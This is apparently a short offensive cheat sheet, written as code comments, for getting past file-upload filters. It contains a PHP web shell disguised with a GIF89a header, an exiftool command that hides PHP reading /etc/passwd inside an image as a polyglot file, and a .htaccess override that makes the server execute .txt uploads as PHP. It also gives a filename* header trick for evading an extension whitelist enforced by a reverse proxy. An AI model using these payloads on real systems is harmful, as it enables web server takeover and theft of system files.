// File Upload
//! Filter bypass
//* bypass image filtering easy mode
// GIF89a # indicates the start of a GIF file
// <?php passthru($_GET['cmd']); ?>
//* bypass image filteing hard mode
// exiftool -Comment="<?php echo system('cat /etc/passwd'); ?>" img.jpg -o polyglot.php
//* bypass .php extension filtering
// on apache server we need to override the .htaccess file with
// #define width 16 => just to be accepted as image
// #define height 7
// <FilesMatch \.txt$> => execute .txt files as .php files
//         SetHandler application/x-httpd-php
// </FilesMatch>
// then upload the actual file file.txt
// GIF89a
// <?php passthru($_GET['cmd']); ?>
//* bypass whitlist only extensions
// by adding filename with extended filename*
// ex:
// filename="image.png";
//  filename*=UTF-8''attack.svg
// if there is a reverse proxy doing the filtering, it might see the first filename
// and the server will see the second one
// the space at the beginning of the filename* makes the reverse proxy not interpret it
// the results uploading attack.svg as an image


